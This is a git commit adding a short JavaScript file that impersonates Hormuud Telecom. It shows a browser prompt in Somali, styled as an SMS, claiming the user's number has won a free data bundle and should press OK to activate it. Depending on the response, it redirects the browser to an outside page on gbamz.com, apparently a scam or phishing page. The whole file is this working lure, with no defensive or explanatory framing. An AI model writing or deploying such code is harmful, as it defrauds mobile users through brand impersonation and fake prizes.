2f36d55d26268a6a859e2c3e467e0a07ab349ebc
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-05 09:33:20 +0100

    Create hormuud-telecom.js

---
+++ hormuud-telecom.js
@@ -0,0 +1,5 @@
+var password = 'NAQLI'
+password=prompt('SMS: Hambalyo, Hormuud Telecom nambarkaaga waxa uu xaq u leeyahay in uu helo Xirmada Xogta Bilaashka ah ee 1 Bilaashka ah, guji OK si aad u dhaqaajiso xidhmadaada xogta','NAQLI');
+if (password != 'NAQLI') {
+location.href='https://gbamz.com/hormuud.html';
+}
